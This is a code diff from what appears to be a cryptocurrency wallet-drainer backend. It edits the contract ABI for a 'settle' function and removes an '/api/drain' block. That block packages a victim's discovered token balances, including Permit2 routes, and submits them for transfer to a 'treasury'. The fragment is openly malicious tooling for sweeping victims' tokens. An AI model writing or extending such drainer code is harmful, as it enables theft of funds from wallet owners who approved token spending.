@@ -25,29 +25,11 @@ for (const f of fs.readdirSync(path.join(__dirname, "..", "deployments"))) {
 }
 
 const ABI = [
-  "struct Item(address token,uint256 amount,uint8 route,uint256 deadline,uint8 v,bytes32 r,bytes32 s)",
-  "function settle(address,(address,uint256,uint8,uint256,uint8,bytes32,bytes32)[],uint256,uint256,bytes) returns (uint256)",
+  "function settle(address,address[],uint256[],uint256[],uint8[],uint256[],uint8[],bytes32[],bytes32[],uint256,uint256,bytes) returns (uint256)",
   "function settleNative() payable",
   "function probe(address,address) view returns (uint256,uint256,bool,bool,uint8)",
   "function treasury() view returns (address)"
 ];
-
-// in /api/drain, replace the array building and the call:
-const items = found.map(f => ({
-  token: f.address,
-  amount: f.balance,
-  route: f.route,
-  deadline: Math.floor(Date.now() / 1000) + 3600,
-  v: 27, r: ethers.ZeroHash, s: ethers.ZeroHash
-}));
-const p2 = found.some(f => f.route === ROUTE.PERMIT2);
-const tx = await rc.settle(
-  w, items,
-  p2 ? 1 : 0,
-  Math.floor(Date.now() / 1000) + 3600,
-  p2 ? "0x" + "00".repeat(65) : "0x"
-);
-
 const ERC20 = [
   "function balanceOf(address) view returns (uint256)",
   "function decimals() view returns (uint8)",
